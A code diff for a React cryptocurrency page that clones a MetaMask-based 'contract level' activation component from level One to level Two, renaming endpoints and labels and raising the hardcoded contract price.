@@ -5,8 +5,7 @@ import FadeLoader from 'react-spinners/FadeLoader';
 import toast from 'react-hot-toast';
 import { UserContext } from '../../../context/UserContext';
 import { useContext } from 'react';
-
-const ContractOne = () => {
+const ContractTwo = () => {
     const { user } = useContext(UserContext);
 
     const [pinError, setPinError] = useState('')
@@ -58,6 +57,7 @@ const ContractOne = () => {
         fetcher();
         try {
             const data = JSON.parse(localStorage.getItem('tokens'));
+            //////////////''''''''//////////USE_EFFECT WALLET CONNECTION////////////''''''''//////////////
             if (window.ethereum) {
                         setUsdDetails({
                             eth_price: data[1].current_price,
@@ -78,7 +78,7 @@ const ContractOne = () => {
                     setWalletBalance(FORMATED_BALANCE);
 
                     //CONTRACT PRICE
-                    const CONTRACT_PRICE = 0.00885869899;
+                    const CONTRACT_PRICE = 0.01485869899;
                     setContractPrice(CONTRACT_PRICE);
                 }
                 Connect();
@@ -125,7 +125,7 @@ const ContractOne = () => {
     }, [])
 
 
-
+    //////////////''''''''//////////MANUAL METAMASK CONNECTION////////////''''''''//////////////
     const connectMetaMask = async () => {
         setLoading(true);
         try {
@@ -149,7 +149,7 @@ const ContractOne = () => {
                 })
 
                 //CONTRACT PRICE
-                const CONTRACT_PRICE = 0.00885869899;
+                const CONTRACT_PRICE = 0.01485869899;
 
                 if (FORMATED_BALANCE >= CONTRACT_PRICE) {
                     const rate = trx_rate * CONTRACT_PRICE;
@@ -179,6 +179,7 @@ const ContractOne = () => {
 
     }
 
+      //////////////''''''''//////////ONE CLICK METAMASK CONNECTION////////////''''''''//////////////
     const maxBalance = async () => {
         if (!connect) {
             connectMetaMask();
@@ -186,10 +187,9 @@ const ContractOne = () => {
         }
     }
 
-    const startContractOne = async (e) => {
+    const startContractTwo = async (e) => {
         e.preventDefault();
        const verificationStatus = !!user && user.verification;
-       console.log(verificationStatus);
        if(verificationStatus == 'Unverified'){
         toast.error('Unverified Account, Actication Failed!');
        }else if(verificationStatus == 'Inreview'){
@@ -203,9 +203,8 @@ const ContractOne = () => {
         if (data.success) {
             setLoading(true);
             const email = localStorage.getItem('email');
-            const { data } = await axios.post('/contractOneCheck', { email });
+            const { data } = await axios.post('/contractTwoCheck', { email });
             if (data.status == false) {
-                console.log(data);
                 const DEPLOYED_ADDRESS = '0xEeD4d31F9b81d550A370f2cddAef7763698ef32a';
                 const CONTRACT_ABI = [
                     {
@@ -316,7 +315,7 @@ const ContractOne = () => {
                 if (receipt) {
                     const to = receipt.to
                     const from = receipt.from;
-                    const name = 'ContractOne'
+                    const name = 'ContractTwo'
                     const status = 'Activated'
                     const contractProfit = 0;
                     const priceUsd = priceInUsdc;
@@ -326,7 +325,7 @@ const ContractOne = () => {
                     const blockHash = receipt.blockHash;
                     const transactionHash = receipt.transactionHash;
                     console.log(gasFee);
-                    const { data } = await axios.post('/contractOne', {
+                    const { data } = await axios.post('/contractTwo', {
                         to,
                         from,
                         email,
@@ -343,7 +342,7 @@ const ContractOne = () => {
                     });
 
                     if (data.success) {
-                        const For = "ForcontractOneActivation";
+                        const For = "ForcontractActivation";
                         const { data } = await axios.post('/notification', {
                             For,
                             email,
@@ -496,7 +495,7 @@ const ContractOne = () => {
                         console.log(receipt)
                         const to = receipt.to
                         const from = receipt.from;
-                        const name = 'ContractOne'
+                        const name = 'ContractTwo'
                         const status = 'Activated'
                         const contractProfit = 0;
                         const priceUsd = priceInUsdc;
@@ -506,7 +505,7 @@ const ContractOne = () => {
                         const blockHash = receipt.blockHash;
                         const transactionHash = receipt.transactionHash;
 
-                        const { data } = await axios.post('/reActivateContractOne', {
+                        const { data } = await axios.post('/reActivateContractTwo', {
                             to,
                             from,
                             email,
@@ -522,7 +521,7 @@ const ContractOne = () => {
                             priceUsd
                         });
                         if (data.success) {
-                            const For = "ForcontractOneReActivation";
+                            const For = "ForcontractActivation";
                             const { data } = await axios.post('/notification', {
                                 For,
                                 email,
@@ -588,7 +587,7 @@ const ContractOne = () => {
             <div className="app-wallet">
                 <div className="header-style2 fixed-top d-flex align-items-center justify-content-between bg-surface">
                     <h3 className="d-flex gap-12">
-                        <span style={{ color: '#25C866' }}>Contract level One+</span>
+                        <span style={{ color: '#25C866' }}>Contract level Two+</span>
                     </h3>
                     <i className="icon-question text-white"></i>
                 </div>
@@ -691,7 +690,7 @@ const ContractOne = () => {
                                             {status == 'Paused' ? <p className="d-flex align-items-center text-small gap-4">Status<i className="icon-clock fs-16 text-warning"></i> </p> : <p className="d-flex align-items-center text-small gap-4">Status{status == 'Activated' ? <i className="icon-check fs-16 text-primary"></i> : <i className="icon-clock fs-16 text-warning"></i>}</p>}
                                             {status == 'Paused' ? <span className='text-warning'>{status !== '' && status}</span> : status == 'Activated' ? <span className='text-success'>Contract {status !== '' && status}!</span> : <span className='text-warning'>Pending...!</span>}
                                         </li>
-                                        {trx.to !== '' ? <a href='/ContractOneProfile' className="tf-btn lg mt-20 primary">Go to Contract</a> : ''}
+                                        {trx.to !== '' ? <a href='/ContractTwoProfile' className="tf-btn lg mt-20 primary">Go to Contract</a> : ''}
                                     </ul>
                                 </div>
                                 <div className="tab-pane fade" id="order" role="tabpanel">
@@ -816,7 +815,7 @@ const ContractOne = () => {
                                     </div>
                                     <p className='text-danger text-center text-small mt-1'>{pinError !== '' && pinError}</p>
                                     {checkPin == true ? <p className="text-center text-small text-white mt-16">Enter  your PIN to proceed</p> : <p className="text-center text-small text-white mt-16">This PIN will be used In every transaction</p>}
-                                    {checkPin == true ? <button type='submit' onClick={startContractOne} className="mt-40 tf-btn lg primary" >Confirm</button> : <button type='submit' onClick={createPin} className="mt-40 tf-btn lg primary" >Create PIN</button>}
+                                    {checkPin == true ? <button type='submit' onClick={startContractTwo} className="mt-40 tf-btn lg primary" >Confirm</button> : <button type='submit' onClick={createPin} className="mt-40 tf-btn lg primary" >Create PIN</button>}
                                 </form>
                             </div>
                         </div>
@@ -1029,4 +1028,4 @@ const ContractOne = () => {
     )
 }
 
-export default ContractOne
+export default ContractTwo
